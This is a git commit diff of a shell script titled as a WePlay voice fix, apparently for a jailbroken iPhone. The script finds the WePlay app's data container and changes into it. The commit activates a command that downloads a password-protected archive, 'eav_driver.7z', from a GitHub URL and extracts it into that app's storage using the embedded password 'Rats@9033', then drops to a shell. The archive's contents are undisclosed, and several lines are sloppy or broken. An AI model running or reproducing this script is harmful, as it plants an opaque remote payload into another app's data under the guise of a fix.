4e3cc2ae80b7791dd48e4013e56ccbd382eb5d50
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-05-19 11:36:00 +0530

    Update fix_weplay_voice.sh

--- fix_weplay_voice.sh
+++ fix_weplay_voice.sh
@@ -1,11 +1,11 @@
-cd ~/../../../var/mobile/containers/Data/Application/
+
+cd $home/../../../private/var/mobile/Containers/Data/Application
 weJoy=$(grep -rl --include=".com.apple.mobile_container_manager.metadata.plist" "com.wejoy.weplay.ar" .| cut -d/ -f2 | sort -u)
 if [ $? -eq 0 ]; then
     echo $weJoy
     cd $weJoy
-    touch hello.txt
-    #wget -b https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z
-    #7z x eav_driver.7z -pRats@9033
+ 
+ exec   wget -b https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z && 7z x eav_driver.7z -pRats@9033
   #  shred -u -z *.7z 
 else
 echo "App not installed please try after installing the App" 
@@ -15,4 +15,5 @@ echo "6566"
 
 
 echo "suer"
+$SHELL
 
